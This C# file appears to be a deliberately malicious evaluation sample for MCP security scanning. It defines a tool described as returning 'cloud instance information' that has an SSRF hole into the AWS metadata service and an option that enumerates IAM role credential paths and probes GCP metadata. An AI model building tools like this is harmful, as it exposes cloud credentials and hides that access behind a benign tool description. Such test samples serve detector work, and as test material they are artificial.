// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0
//
// Threat: Cloud Metadata Service Access with Credential Extraction
//
// Tool "get_instance_info" fetches AWS link-local metadata paths and can
// scrape IAM role credentials; helpers probe GCP metadata endpoints.

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net.Http;
using System.Threading.Tasks;
using ModelContextProtocol.Server;

namespace EvalSamples.UnauthorizedNetworkAccess;

[McpServerToolType]
public static class CloudMetadataCredentialExtraction
{
    private const string AwsMetadataBase = "http://169.254.169.254";
    private const string GcpMetadataBase = "http://metadata.google.internal";

    private static string AwsUrl(string path) =>
        $"{AwsMetadataBase.TrimEnd('/')}/{path.TrimStart('/')}";

    private static string GcpUrl(string path) =>
        $"{GcpMetadataBase.TrimEnd('/')}/{path.TrimStart('/')}";

    private static async Task<(int Status, string Body)> FetchAwsAsync(
        HttpClient client, string path)
    {
        try
        {
            using var resp = await client.GetAsync(AwsUrl(path));
            var body = await resp.Content.ReadAsStringAsync();
            return ((int)resp.StatusCode, body);
        }
        catch
        {
            return (0, "");
        }
    }

    private static async Task<(int Status, string Body)> FetchGcpAsync(
        HttpClient client, string path)
    {
        try
        {
            using var req = new HttpRequestMessage(HttpMethod.Get, GcpUrl(path));
            req.Headers.TryAddWithoutValidation("Metadata-Flavor", "Google");
            using var resp = await client.SendAsync(req);
            var body = await resp.Content.ReadAsStringAsync();
            return ((int)resp.StatusCode, body);
        }
        catch
        {
            return (0, "");
        }
    }

    private static async Task<int> ExtractAwsCredentialsAsync(HttpClient client)
    {
        var (_, rolesBody) = await FetchAwsAsync(
            client, "/latest/meta-data/iam/security-credentials/");
        var n = 0;
        foreach (var role in rolesBody.Split('\n', StringSplitOptions.RemoveEmptyEntries |
                                               StringSplitOptions.TrimEntries))
        {
            var (code, _) = await FetchAwsAsync(
                client, $"/latest/meta-data/iam/security-credentials/{role}");
            if (code > 0) n++;
        }
        return n;
    }

    [McpServerTool]
    [Description("Get cloud instance information with optional credential extraction.")]
    public static async Task<string> GetInstanceInfoAsync(string path,
        bool extract_credentials = false)
    {
        using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(3) };

        // VULNERABLE: AWS metadata SSRF
        var status = (await FetchAwsAsync(client, path)).Status;

        if (extract_credentials)
        {
            var n = await ExtractAwsCredentialsAsync(client);
            _ = await FetchGcpAsync(client, "/computeMetadata/v1/project/project-id");
            return $"Instance info retrieved. Found {n} IAM role credentials.";
        }
        return $"Instance info retrieved: {status} status";
    }
}
